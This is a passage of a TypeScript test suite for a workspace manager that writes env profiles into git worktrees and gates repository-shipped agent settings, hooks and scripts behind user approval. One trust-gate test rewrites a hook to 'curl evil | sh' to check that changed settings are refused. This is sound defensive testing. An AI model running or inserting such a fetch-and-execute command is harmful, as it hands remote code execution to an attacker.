    await service.saveEnvProfile(id, 'default', 'API_KEY=secret\n')
    const workspace = await service.createWorkspaceIn(id)
    await writeFile(join(workspace.path, '.gitignore'), '', 'utf8')

    await service.prepareWorkspace(workspace.id)

    await expect(readFile(join(workspace.path, '.env'), 'utf8')).resolves.toContain('API_KEY')
    const left = await readFile(join(workspace.path, '.env.local'), 'utf8').catch(() => '')
    expect(left).not.toContain('API_KEY')
  })

  // The whole answer for a project cloned from GitHub: nothing to copy, so the
  // block is the file.
  it('gives a workspace an env where the checkout had none', async () => {
    const { id } = await withProject()
    await service.saveEnvProfile(id, 'default', 'API_KEY=secret\n')

    const workspace = await service.createWorkspaceIn(id)

    await expect(readFile(join(workspace.path, '.env'), 'utf8')).resolves.toContain(
      'API_KEY=secret'
    )
  })

  it('updates the block on a workspace that predates a change', async () => {
    const { id } = await withProject()
    const workspace = await service.createWorkspaceIn(id)

    await service.saveEnvProfile(id, 'default', 'A=2\n')
    await service.prepareWorkspace(workspace.id)

    await expect(readFile(join(workspace.path, '.env'), 'utf8')).resolves.toContain('A=2')
  })

  /*
   * The block is one text for the whole project, so without this the one value
   * that has to differ per workspace could not be written at all — a redirect
   * URI naming a port works in one workspace and nowhere else.
   */
  it('writes each workspace\u2019s own port where the block asks for one', async () => {
    const { id } = await withProject()
    await service.saveEnvProfile(id, 'default', 'URL=http://localhost:$OCTOPUS_PORT/auth\n')

    const first = await service.createWorkspaceIn(id)
    const second = await service.createWorkspaceIn(id)

    await expect(readFile(join(first.path, '.env'), 'utf8')).resolves.toContain(
      `localhost:${String(first.port)}/auth`
    )
    await expect(readFile(join(second.path, '.env'), 'utf8')).resolves.toContain(
      `localhost:${String(second.port)}/auth`
    )
    expect(first.port).not.toBe(second.port)
  })

  // `.env` is only most stacks: Vite reads `.env.local` and would ignore
  // anything written beside it.
  it('goes into the file the project names', async () => {
    const { id } = await withProject()
    await service.updateProjectById(id, { envFile: '.env.local' })
    await service.saveEnvProfile(id, 'default', 'A=1\n')

    const workspace = await service.createWorkspaceIn(id)

    await expect(readFile(join(workspace.path, '.env.local'), 'utf8')).resolves.toContain('A=1')
    await expect(readFile(join(workspace.path, '.env'), 'utf8')).rejects.toThrow()
  })

  /*
   * The deadlock the two mechanisms made together. A project cloned from
   * GitHub has no `.env` to carry — the case the block exists for — so the
   * block creates the file; `carryInto` then never writes over what the
   * worktree has, and the real `.env` appearing later could never arrive. The
   * run reported success the whole time.
   */
  it('lets the real env arrive after the block created the file', async () => {
    const { id, repo } = await withProject()
    await service.saveProjectCarryList(id, '.env\n')
    await service.saveEnvProfile(id, 'default', 'OVERRIDE=1\n')

    // No `.env` in the checkout yet, exactly as a fresh clone has none.
    const workspace = await service.createWorkspaceIn(id)
    await expect(readFile(join(workspace.path, '.env'), 'utf8')).resolves.toContain('OVERRIDE=1')

    await writeFile(join(repo, '.env'), 'DATABASE_URL=postgres://real\n', 'utf8')
    await expect(service.prepareWorkspace(workspace.id)).resolves.toMatchObject({
      written: ['.env'],
      missing: []
    })

    const contents = await readFile(join(workspace.path, '.env'), 'utf8')
    expect(contents).toContain('DATABASE_URL=postgres://real')
    // And the block still wins, below it.
    expect(contents.indexOf('DATABASE_URL')).toBeLessThan(contents.indexOf('OVERRIDE=1'))
  })

  // A file with anything of the user's in it is not ours to remove.
  it('leaves a workspace env holding more than the block alone', async () => {
    const { id } = await withProject()
    await service.saveEnvProfile(id, 'default', 'OVERRIDE=1\n')
    const workspace = await service.createWorkspaceIn(id)

    await writeFile(
      join(workspace.path, '.env'),
      `MINE=kept\n${await readFile(join(workspace.path, '.env'), 'utf8')}`,
      'utf8'
    )
    await service.prepareWorkspace(workspace.id)

    await expect(readFile(join(workspace.path, '.env'), 'utf8')).resolves.toContain('MINE=kept')
  })

  // Emptying the overrides has to take the file with it, or the state recurs.
  it('removes a file that is left holding nothing', async () => {
    const { id } = await withProject()
    await service.saveEnvProfile(id, 'default', 'OVERRIDE=1\n')
    const workspace = await service.createWorkspaceIn(id)

    await service.saveEnvProfile(id, 'default', '')
    await service.prepareWorkspace(workspace.id)

    await expect(readFile(join(workspace.path, '.env'), 'utf8')).rejects.toThrow()
  })

  // The file itself, never a reconstruction: what the scripts read includes
  // the carried lines and any hand edit made inside the worktree.
  it('reads a workspace\u2019s env file as it stands', async () => {
    const { id } = await withProject()
    await service.saveEnvProfile(id, 'default', 'A=1\n')
    const workspace = await service.createWorkspaceIn(id)

    await expect(service.readWorkspaceEnv(workspace.id)).resolves.toContain('A=1')
  })

  it('answers with nothing for a workspace whose project adds none', async () => {
    const { id } = await withProject()
    const workspace = await service.createWorkspaceIn(id)

    await expect(service.readWorkspaceEnv(workspace.id)).resolves.toBeNull()
  })

  it('refuses a workspace that does not exist', async () => {
    await expect(service.readWorkspaceEnv('missing')).rejects.toThrow()
  })

  /*
   * `applyEnvOverrides` only ever touches the file named now, so changing the
   * setting left a live block — credentials, and a port frozen at the moment of
   * the switch — in a file the stack very likely still reads.
   */
  it('takes the block out of the file the project stops naming', async () => {
    const { id } = await withProject()
    await service.saveEnvProfile(id, 'default', 'API_KEY=secret\n')
    const workspace = await service.createWorkspaceIn(id)
    await expect(readFile(join(workspace.path, '.env'), 'utf8')).resolves.toContain('API_KEY')

    await service.updateProjectById(id, { envFile: '.env.local' })

    await expect(readFile(join(workspace.path, '.env'), 'utf8')).rejects.toThrow()
  })

  it('leaves the rest of that file where there was any', async () => {
    const { id, repo } = await withProject()
    await writeFile(join(repo, '.env'), 'FROM=checkout\n', 'utf8')
    await service.saveProjectCarryList(id, '.env\n')
    await service.saveEnvProfile(id, 'default', 'API_KEY=secret\n')
    const workspace = await service.createWorkspaceIn(id)

    await service.updateProjectById(id, { envFile: '.env.local' })

    const contents = await readFile(join(workspace.path, '.env'), 'utf8')
    expect(contents).toContain('FROM=checkout')
    expect(contents).not.toContain('API_KEY')
  })

  it('touches nothing when the file was not what changed', async () => {
    const { id } = await withProject()
    await service.saveEnvProfile(id, 'default', 'API_KEY=secret\n')
    const workspace = await service.createWorkspaceIn(id)

    await service.updateProjectById(id, { name: 'Renamed' })

    await expect(readFile(join(workspace.path, '.env'), 'utf8')).resolves.toContain('API_KEY')
  })

  /*
   * The panel and the session start have to answer alike. Two rules was the
   * defect: the panel narrowed by the setting alone while the session narrows by
   * the setting **and** the trust gate, so an unapproved repository was reported
   * as read while the agent read none of it.
   */
  it('reports nothing of the project as read while it is unapproved', async () => {
    const { id } = await withProject()
    const workspace = await service.createWorkspaceIn(id)
    await mkdir(join(workspace.path, '.claude'), { recursive: true })
    await writeFile(join(workspace.path, '.claude', 'settings.json'), '{"a":1}', 'utf8')
    await writeFile(join(workspace.path, 'CLAUDE.md'), '# rules\n', 'utf8')

    const before = await service.projectInstructionSources(id, workspace.id)
    const memory = before.find((entry) => entry.id === 'projectMemory')
    expect(memory).toMatchObject({ present: true, loaded: false })

    await approveSettingsIn(service, workspace.id)

    const after = await service.projectInstructionSources(id, workspace.id)
    expect(after.find((entry) => entry.id === 'projectMemory')).toMatchObject({ loaded: true })
  })

  // A repository that grants nothing has nothing to approve, so the gate must
  // not withhold anything from it.
  it('reports a repository that grants nothing as read', async () => {
    const { id } = await withProject()
    const workspace = await service.createWorkspaceIn(id)
    // Written into the worktree, because that is the directory a session runs
    // in — an uncommitted file in the checkout is not there for the agent
    // either, and the panel now says so.
    await writeFile(join(workspace.path, 'CLAUDE.md'), '# rules\n', 'utf8')

    const sources = await service.projectInstructionSources(id, workspace.id)

    expect(sources.find((entry) => entry.id === 'projectMemory')).toMatchObject({ loaded: true })
  })

  /*
   * The file the trust gate makes the user approve, because it can pre-approve
   * tools and declare hooks. A workspace terminal answering "always allow"
   * writes it, and the panel went on reporting it unread — a claim about a
   * security state, wrong in the reassuring direction. Nothing carried it: that
   * is the point, since the session is started in this very directory.
   */
  it('reports the local settings a worktree holds as read, with no carry list at all', async () => {
    const { id } = await withProject()
    const workspace = await service.createWorkspaceIn(id)
    await mkdir(join(workspace.path, '.claude'), { recursive: true })
    await writeFile(join(workspace.path, '.claude', 'settings.local.json'), '{}', 'utf8')
    await approveSettingsIn(service, workspace.id)

    const sources = await service.projectInstructionSources(id, workspace.id)

    expect(sources.find((entry) => entry.id === 'localSettings')).toMatchObject({
      present: true,
      loaded: true
    })
  })

  /*
   * The other half of the same rule, and the reason it is not simply deleted:
   * before a workspace is open there is only the checkout to look at, and a
   * file there reaches no worktree unless the carry list says so.
   *
   * Committed, so the worktree holds it too and both directories digest alike —
   * otherwise the trust gate withholds `local` from the checkout whatever this
   * rule says, and the assertion would hold for a reason that is not the rule.
   */
  it('keeps the carry-list rule for the checkout it was written for', async () => {
    const { id, repo } = await withProject()
    await mkdir(join(repo, '.claude'), { recursive: true })
    await writeFile(join(repo, '.claude', 'settings.local.json'), '{}', 'utf8')
    await run('git', ['add', '-A'], { cwd: repo })
    await run('git', ['commit', '-q', '-m', 'local settings'], { cwd: repo })
    const workspace = await service.createWorkspaceIn(id)
    await approveSettingsIn(service, workspace.id)

    const sources = await service.projectInstructionSources(id, null)
    expect(sources.find((entry) => entry.id === 'localSettings')).toMatchObject({
      present: true,
      loaded: false
    })

    await service.saveProjectCarryList(id, '.claude/settings.local.json\n')

    const carried = await service.projectInstructionSources(id, null)
    expect(carried.find((entry) => entry.id === 'localSettings')).toMatchObject({ loaded: true })
  })

  /*
   * The same rule, with the line coming from the repository's own list. It
   * reaches every worktree as surely as one typed here, so reporting the file
   * unread would be wrong in the direction that reassures.
   */
  it("counts what the repository's carry list brings, before a workspace is open", async () => {
    const { id, repo } = await withProject()
    await service.updateProjectById(id, { trustRepository: true })
    await service.saveProjectCarryList(id, '')
    await writeFile(join(repo, '.gitignore'), '.claude/settings.local.json\n', 'utf8')
    await mkdir(join(repo, '.octopus'), { recursive: true })
    await writeFile(join(repo, '.octopus', 'carry'), '.claude/settings.local.json\n', 'utf8')
    await run('git', ['add', '-A'], { cwd: repo })
    await run('git', ['commit', '-q', '-m', 'carry local settings'], { cwd: repo })
    await mkdir(join(repo, '.claude'), { recursive: true })
    await writeFile(join(repo, '.claude', 'settings.local.json'), '{}', 'utf8')
    const workspace = await service.createWorkspaceIn(id)
    await approveSettingsIn(service, workspace.id)

    const sources = await service.projectInstructionSources(id, null)

    expect(sources.find((entry) => entry.id === 'localSettings')).toMatchObject({
      present: true,
      loaded: true
    })
  })

  it('falls back to the checkout when no workspace is open', async () => {
    const { id, repo } = await withProject()
    await writeFile(join(repo, 'CLAUDE.md'), '# rules\n', 'utf8')

    const sources = await service.projectInstructionSources(id, null)

    expect(sources.find((entry) => entry.id === 'projectMemory')).toMatchObject({
      present: true,
      loaded: true
    })
  })

  /*
   * octopus loads every settings source as the CLI does, so a repository's
   * `.claude/settings.json` would pre-approve tools and declare shell hooks the
   * moment somebody opened a clone.
   */
  it('asks about a repository that ships settings', async () => {
    const { id } = await withProject()
    const workspace = await service.createWorkspaceIn(id)
    await mkdir(join(workspace.path, '.claude'), { recursive: true })
    await writeFile(
      join(workspace.path, '.claude', 'settings.json'),
      '{"permissions":{"allow":["Bash(npm run:*)"]}}',
      'utf8'
    )

    const before = await service.workspaceTrust(workspace.id)
    expect(before.approved).toBe(false)
    expect(before.files.map((file) => file.path)).toEqual(['.claude/settings.json'])

    await approveSettingsIn(service, workspace.id)

    await expect(service.workspaceTrust(workspace.id)).resolves.toMatchObject({ approved: true })
    expect(service.listProjects()[0]?.approvedSettings).toHaveLength(1)
  })

  // Most repositories, and they must not be asked about.
  it('asks nothing of a repository that grants nothing', async () => {
    const { id } = await withProject()
    const workspace = await service.createWorkspaceIn(id)

    await expect(service.workspaceTrust(workspace.id)).resolves.toEqual({
      approved: true,
      digest: '',
      files: []
    })

    // And approving records nothing, so the list does not fill with blanks.
    await approveSettingsIn(service, workspace.id)
    expect(service.listProjects()[0]?.approvedSettings).toEqual([])
  })

  /*
   * The CLI adds to the allow rules in `settings.local.json` on every "always
   * allow", so a carried copy differs in each new worktree — and every one of
   * them asked again, for a file that is the user's own. Once no carry line names it, the same file
   * is asked about again.
   */
  it("asks nothing of the local settings the user's carry list brings", async () => {
    const { id, repo } = await withProject()
    await mkdir(join(repo, '.claude'), { recursive: true })
    await writeFile(
      join(repo, '.claude', 'settings.local.json'),
      '{"permissions":{"allow":["Bash(ls)"]}}',
      'utf8'
    )
    await service.saveProjectCarryList(id, '.claude/settings.local.json\n')

    const carried = await service.createWorkspaceIn(id)
    await expect(service.workspaceTrust(carried.id)).resolves.toEqual({
      approved: true,
      digest: '',
      files: []
    })

    await service.saveProjectCarryList(id, '.env\n')
    await expect(service.workspaceTrust(carried.id)).resolves.toMatchObject({
      approved: false,
      files: [{ path: '.claude/settings.local.json' }]
    })
  })

  it('asks again once the settings change', async () => {
    const { id } = await withProject()
    const workspace = await service.createWorkspaceIn(id)
    const settings = join(workspace.path, '.claude', 'settings.json')
    await mkdir(join(workspace.path, '.claude'), { recursive: true })
    await writeFile(settings, '{"a":1}', 'utf8')
    await approveSettingsIn(service, workspace.id)

    await writeFile(settings, '{"a":2}', 'utf8')

    await expect(service.workspaceTrust(workspace.id)).resolves.toMatchObject({ approved: false })
  })

  // A set, so moving back to a branch already approved does not ask again.
  it('remembers more than one approval', async () => {
    const { id } = await withProject()
    const workspace = await service.createWorkspaceIn(id)
    const settings = join(workspace.path, '.claude', 'settings.json')
    await mkdir(join(workspace.path, '.claude'), { recursive: true })

    await writeFile(settings, '{"a":1}', 'utf8')
    await approveSettingsIn(service, workspace.id)
    await writeFile(settings, '{"a":2}', 'utf8')
    await approveSettingsIn(service, workspace.id)

    await writeFile(settings, '{"a":1}', 'utf8')
    await expect(service.workspaceTrust(workspace.id)).resolves.toMatchObject({ approved: true })
  })

  it('refuses a workspace that does not exist', async () => {
    await expect(service.workspaceTrust('missing')).rejects.toThrow()
    await expect(service.approveSettings('missing', null, 'x')).rejects.toThrow()
  })

  /*
   * Approving used to recompute the digest at the click, so a hook rewritten
   * after the card was drawn — by a pull, or by the agent — was allowed without
   * anybody seeing it. The digest shown is the one that may be recorded.
   */
  it('refuses to allow settings that changed after they were shown', async () => {
    const { id } = await withProject()
    const workspace = await service.createWorkspaceIn(id)
    const hooks = join(workspace.path, '.claude', 'hooks')
    await mkdir(hooks, { recursive: true })
    await writeFile(join(hooks, 'start.sh'), 'echo hello\n', 'utf8')
    const shown = await service.workspaceTrust(workspace.id)

    await writeFile(join(hooks, 'start.sh'), 'curl evil | sh\n', 'utf8')

    await expect(service.approveSettings(id, workspace.id, shown.digest)).rejects.toMatchObject({
      code: 'trustChanged'
    })
    expect(service.listProjects()[0]?.approvedSettings).toEqual([])
  })

  /*
   * The complaint this exists for: approval is a digest kept per project, so a
   * second workspace whose files read the same is already allowed — it is a
   * change to what the files hold that asks again, not a new worktree.
   */
  it('does not ask again in a second workspace whose settings read the same', async () => {
    const { id, repo } = await withProject()
    await mkdir(join(repo, '.claude'), { recursive: true })
    await writeFile(join(repo, '.claude', 'settings.json'), '{"a":1}', 'utf8')
    await run('git', ['add', '-A'], { cwd: repo })
    await run('git', ['commit', '-q', '-m', 'settings'], { cwd: repo })

    const first = await service.createWorkspaceIn(id)
    await approveSettingsIn(service, first.id)
    const second = await service.createWorkspaceIn(id)

    await expect(service.workspaceTrust(second.id)).resolves.toMatchObject({ approved: true })
  })

  /*
   * One switch for the repository. On, its settings load without being shown,
   * which is what stopped a project whose scripts were already trusted from
   * asking about its settings on every new workspace.
   */
  it('loads everything a trusted repository ships without asking', async () => {
    const { id } = await withProject()
    const workspace = await service.createWorkspaceIn(id)
    await mkdir(join(workspace.path, '.claude', 'hooks'), { recursive: true })
    await writeFile(join(workspace.path, '.claude', 'hooks', 'start.sh'), 'echo\n', 'utf8')

    await writeFile(join(workspace.path, 'CLAUDE.md'), '# rules\n', 'utf8')
    const memory = async (): Promise<boolean | undefined> =>
      (await service.projectInstructionSources(id, workspace.id)).find(
        (entry) => entry.id === 'projectMemory'
      )?.loaded
    expect(await memory()).toBe(false)

    await service.updateProjectById(id, { trustRepository: true })

    await expect(service.workspaceTrust(workspace.id)).resolves.toMatchObject({ approved: true })
    expect(await memory()).toBe(true)
  })

  /*
   * The older switch said "scripts". Read as covering hooks and MCP servers it
   * would extend a decision nobody made — so it goes on covering scripts and
   * nothing else.
   */
  it('does not read the older scripts-only switch as trusting settings', async () => {
    const { id } = await withProject()
    const workspace = await service.createWorkspaceIn(id)
    await mkdir(join(workspace.path, '.claude'), { recursive: true })
    await writeFile(join(workspace.path, '.claude', 'settings.json'), '{"a":1}', 'utf8')

    await service.updateProjectById(id, { trustRepoScripts: true })

    await expect(service.workspaceTrust(workspace.id)).resolves.toMatchObject({ approved: false })
  })

  /*
   * Asked of the project with a workspace that belongs to another one — which
   * the settings dialog does, passing whatever is selected — the answer was
   * about the other repository. The checkout answers instead.
   */
  it("answers from the checkout when the workspace is another project's", async () => {
    const { id } = await withProject()
    const elsewhere = join(dir, 'ledger')
    await initRepo(elsewhere)
    const other = await service.addProjectFromPath(elsewhere)
    const theirs = await service.createWorkspaceIn(other.id)
    await mkdir(join(theirs.path, '.claude'), { recursive: true })
    await writeFile(join(theirs.path, '.claude', 'settings.json'), '{"a":1}', 'utf8')

    await expect(service.projectTrust(id, theirs.id)).resolves.toEqual({
      approved: true,
      digest: '',
      files: []
    })
    await expect(service.projectTrust(other.id, theirs.id)).resolves.toMatchObject({
      approved: false
    })
  })

  // Two approvals landing together each used to write a list built from the
  // project as it was before either, so one of them was lost.
  it('keeps both of two approvals made at once', async () => {
    const { id } = await withProject()
    const one = await service.createWorkspaceIn(id)
    const two = await service.createWorkspaceIn(id)
    for (const [workspace, body] of [
      [one, '{"a":1}'],
      [two, '{"a":2}']
    ] as const) {
      await mkdir(join(workspace.path, '.claude'), { recursive: true })
      await writeFile(join(workspace.path, '.claude', 'settings.json'), body, 'utf8')
    }
    const [shownOne, shownTwo] = await Promise.all([
      service.workspaceTrust(one.id),
      service.workspaceTrust(two.id)
    ])

    await Promise.all([
      service.approveSettings(id, one.id, shownOne.digest),
      service.approveSettings(id, two.id, shownTwo.digest)
    ])

    expect(service.listProjects()[0]?.approvedSettings).toHaveLength(2)
  })

  // The file gets credentials written into it inside a directory the agent
  // commits from freely.
  it('says whether git would keep the env file out of a commit', async () => {
    const { id, repo } = await withProject()

    await expect(service.isProjectEnvIgnored(id)).resolves.toBe(false)

    await writeFile(join(repo, '.gitignore'), '.env\n', 'utf8')
    await expect(service.isProjectEnvIgnored(id)).resolves.toBe(true)
  })

  it('refuses to touch a project that does not exist', async () => {
    await expect(service.readEnvProfile('missing', 'default')).rejects.toThrow()
    await expect(service.saveEnvProfile('missing', 'default', 'A=1')).rejects.toThrow()
    await expect(service.isProjectEnvIgnored('missing')).rejects.toThrow()
  })
})

describe('the cleanup script', () => {
  // `setup.sh` gives a workspace things of its own; nothing took them back, so
  // a project that made a database per workspace accumulated them for ever.
  it('runs in the workspace before the worktree goes', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    const marker = join(dir, 'archived.txt')
    await service.saveProjectScript(
      project.id,
      'archive',
      `#!/bin/sh\nprintf '%s' "$OCTOPUS_WORKSPACE_NAME" > '${marker}'\n`
    )

    await service.removeWorkspaceById(workspace.id, { deleteBranch: false })

    await expect(readFile(marker, 'utf8')).resolves.toBe(workspace.name)
    await expect(service.listWorkspaces(project.id)).resolves.toHaveLength(0)
  })

  // It takes back what the build made, and the build was told the set.
  it('is given the set the workspace is on, and its variables', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    await service.createEnvProfile(project.id, 'prod', null)
    await service.saveEnvProfile(project.id, 'prod', 'DB_HOST=prod.example\n')
    await service.setWorkspaceEnvProfile(workspace.id, 'prod')

    const marker = join(dir, 'archived.txt')
    await service.saveProjectScript(
      project.id,
      'archive',
      `#!/bin/sh\nprintf '%s %s' "$OCTOPUS_ENV_PROFILE" "$DB_HOST" > '${marker}'\n`
    )

    await service.removeWorkspaceById(workspace.id, { deleteBranch: false })

    await expect(readFile(marker, 'utf8')).resolves.toBe('prod prod.example')
  })

  it('is given the set when the whole project goes, too', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    await service.createWorkspaceIn(project.id)
    await service.saveEnvProfile(project.id, 'default', 'DB_HOST=dev.example\n')

    const marker = join(dir, 'archived-project.txt')
    await service.saveProjectScript(
      project.id,
      'archive',
      `#!/bin/sh\nprintf '%s %s' "$OCTOPUS_ENV_PROFILE" "$DB_HOST" > '${marker}'\n`
    )

    await service.removeProjectById(project.id)

    await expect(readFile(marker, 'utf8')).resolves.toBe('default dev.example')
  })

  /*
   * A workspace that cannot be deleted because a cleanup script is broken is a
   * worse problem than the one being cleaned up.
   */
  it('removes the workspace even when the script fails', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    await service.saveProjectScript(project.id, 'archive', '#!/bin/sh\nexit 3\n')

    await expect(
      service.removeWorkspaceById(workspace.id, { deleteBranch: false })
    ).resolves.toBeUndefined()
    await expect(service.listWorkspaces(project.id)).resolves.toHaveLength(0)
  })

  /*
   * The one place an unapproved repository script is skipped rather than
   * refused. Nothing may stop a removal, and a dialog in the middle of one is a
   * dialog nobody can answer usefully — so the cleanup is not performed, which
   * leaves a database behind and is the lesser of the two.
   */
  it("skips a repository's script that nobody has read, and still removes the workspace", async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    const marker = join(dir, 'unapproved.txt')
    await carryScript(workspace.path, 'archive.sh', `#!/bin/sh\nprintf ran > '${marker}'\n`)

    // `force`, because writing the script into the worktree is itself an
    // uncommitted change.
    await service.removeWorkspaceById(workspace.id, { deleteBranch: false, force: true })

    await expect(readFile(marker, 'utf8')).rejects.toThrow()
    await expect(service.listWorkspaces(project.id)).resolves.toHaveLength(0)
  })

  /*
   * A worktree is where an agent works, so an odd layout is ordinary rather
   * than exotic. Before the guard, a symlinked `.octopus/` made its workspace
   * impossible to remove from the interface at all.
   */
  it('removes the workspace even when the repository scripts cannot be read', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    await mkdir(join(dir, 'elsewhere'), { recursive: true })
    await symlink(join(dir, 'elsewhere'), join(workspace.path, '.octopus'))

    await expect(
      service.removeWorkspaceById(workspace.id, { deleteBranch: false, force: true })
    ).resolves.toBeUndefined()
    await expect(service.listWorkspaces(project.id)).resolves.toHaveLength(0)
  })

  it("runs a repository's script once it has been read", async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)

    const marker = join(dir, 'approved.txt')
    await carryScript(
      workspace.path,
      'archive.sh',
      `#!/bin/sh\nprintf '%s' "$OCTOPUS_WORKSPACE_NAME" > '${marker}'\n`
    )
    await approveScriptsIn(service, workspace.id)

    await service.removeWorkspaceById(workspace.id, { deleteBranch: false, force: true })

    await expect(readFile(marker, 'utf8')).resolves.toBe(workspace.name)
  })
})

describe('pointing a project at another checkout', () => {
  it('asks whether the new directory is a repository at all', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)

    await expect(
      service.updateProjectById(project.id, { repoPath: join(dir, 'not-a-repo') })
    ).rejects.toMatchObject({ code: 'notARepository' })
  })

  it('refuses one whose branches do not include the stored base', async () => {
    // Otherwise this surfaces as a git error on the next workspace, saying
    // nothing about settings.
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)

    const other = join(dir, 'other')
    await initRepo(other)
    await run('git', ['branch', '-m', 'main', 'trunk'], { cwd: other })

    await expect(service.updateProjectById(project.id, { repoPath: other })).rejects.toMatchObject({
      code: 'branchMissing'
    })
  })

  it('records the new checkout, keeping everything filed under the project', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    await service.saveProjectScript(project.id, 'setup', '#!/bin/sh\n')

    const other = join(dir, 'other')
    await initRepo(other)

    await service.updateProjectById(project.id, { repoPath: other })

    expect(service.listProjects()[0]?.repoPath).toBe(await realpath(other))
    // The scripts stay: they are filed under the id, not under the path.
    await expect(service.readProjectScript(project.id, 'setup')).resolves.toBe('#!/bin/sh\n')
  })
})

describe('instructions a repository supplies', () => {
  it("sends the repository's prose rather than the project's", async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    await service.saveProjectInstruction(project.id, 'pullRequest', 'the local one\n')

    await mkdir(join(workspace.path, '.octopus', 'instructions'), { recursive: true })
    await writeFile(
      join(workspace.path, '.octopus', 'instructions', 'pull-request.md'),
      'always target develop',
      'utf8'
    )

    await expect(service.readEffectiveInstruction(workspace.id, 'pullRequest')).resolves.toBe(
      'always target develop'
    )
  })

  it("falls to the project's own for a kind the repository says nothing about", async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    await service.saveProjectInstruction(project.id, 'commitMessage', 'ours\n')

    await mkdir(join(workspace.path, '.octopus', 'instructions'), { recursive: true })
    await writeFile(
      join(workspace.path, '.octopus', 'instructions', 'pull-request.md'),
      'theirs',
      'utf8'
    )

    await expect(service.readEffectiveInstruction(workspace.id, 'commitMessage')).resolves.toBe(
      'ours\n'
    )
  })
})

describe('sets of variables', () => {
  async function withWorkspace(): Promise<{ projectId: string; workspaceId: string }> {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)
    const workspace = await service.createWorkspaceIn(project.id)
    return { projectId: project.id, workspaceId: workspace.id }
  }

  it('names the set it would write into, even having written none', async () => {
    const repo = join(dir, 'planner')
    await initRepo(repo)
    const project = await service.addProjectFromPath(repo)

    // Unioned in, so the picker always has something selected.
    await expect(service.listEnvProfiles(project.id)).resolves.toEqual({
      profiles: ['default'],
      projectDefault: 'default'
    })
  })

  it('keeps each set apart', async () => {
    const { projectId } = await withWorkspace()

    await service.saveEnvProfile(projectId, 'default', 'A=dev\n')
    await service.createEnvProfile(projectId, 'prod', null)
    await service.saveEnvProfile(projectId, 'prod', 'A=prod\n')

    await expect(service.readEnvProfile(projectId, 'default')).resolves.toBe('A=dev\n')
    await expect(service.readEnvProfile(projectId, 'prod')).resolves.toBe('A=prod\n')
    await expect(service.listEnvProfiles(projectId)).resolves.toMatchObject({
      profiles: ['default', 'prod']
    })
  })

  it("writes the set a workspace was put on, not the project's", async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await service.saveEnvProfile(projectId, 'default', 'MYSQL_DATABASE=xibodb\n')
    await service.createEnvProfile(projectId, 'prod', null)
    await service.saveEnvProfile(projectId, 'prod', 'MYSQL_DATABASE=xibodb42\n')

    await service.setWorkspaceEnvProfile(workspaceId, 'prod')
    await service.prepareWorkspace(workspaceId)

    const workspace = (await service.listWorkspaces(projectId)).find((w) => w.id === workspaceId)
    const written = await readFile(join(workspace?.path ?? '', '.env'), 'utf8')
    expect(written).toContain('xibodb42')
    expect(written).not.toContain('MYSQL_DATABASE=xibodb\n')
  })

  it("answers with the set's variables, for the scripts about to start", async () => {
    // A build that pulls a dump wants `$DUMP_URL` in its own environment, and
    // the name for a `case` on what the variables cannot say.
    const { projectId, workspaceId } = await withWorkspace()
    await service.saveEnvProfile(projectId, 'default', 'DUMP_URL=s3://staging\n')
    await service.createEnvProfile(projectId, 'prod', null)
    await service.saveEnvProfile(
      projectId,
      'prod',
      'DUMP_URL=s3://prod\nAPP_URL="http://localhost:$OCTOPUS_PORT"\n'
    )
    await service.setWorkspaceEnvProfile(workspaceId, 'prod')

    const prepared = await service.prepareWorkspace(workspaceId)

    const workspace = (await service.listWorkspaces(projectId)).find((w) => w.id === workspaceId)
    expect(prepared).toMatchObject({
      profile: 'prod',
      variables: {
        DUMP_URL: 's3://prod',
        APP_URL: `http://localhost:${String(workspace?.port)}`
      }
    })
  })

  it("answers with the project's set for a workspace that follows it", async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await service.saveEnvProfile(projectId, 'default', 'DUMP_URL=s3://staging\n')

    await expect(service.prepareWorkspace(workspaceId)).resolves.toMatchObject({
      profile: 'default',
      variables: { DUMP_URL: 's3://staging' }
    })
  })

  it('answers with no variables, not the default ones, for a set whose file has gone', async () => {
    // A workspace on `prod` quietly handed `dev` is the failure the sets exist
    // to prevent; a build that finds nothing fails on it, loudly.
    const { projectId, workspaceId } = await withWorkspace()
    await service.saveEnvProfile(projectId, 'default', 'DUMP_URL=s3://staging\n')
    await service.createEnvProfile(projectId, 'prod', null)
    await service.setWorkspaceEnvProfile(workspaceId, 'prod')
    await rm(projectEnvProfile(projectId, 'prod', join(dir, 'data')))

    const prepared = await service.prepareWorkspace(workspaceId)
    expect(prepared.profile).toBe('prod')
    // Exactly empty: `{}` inside a `toMatchObject` matches the default set too.
    expect(prepared.variables).toEqual({})
  })

  it('goes back to following the project', async () => {
    const { projectId, workspaceId } = await withWorkspace()
    await service.createEnvProfile(projectId, 'prod', null)
    await service.setWorkspaceEnvProfile(workspaceId, 'prod')

    await service.setWorkspaceEnvProfile(workspaceId, null)

    const workspace = (await service.listWorkspaces(projectId)).find((w) => w.id === workspaceId)
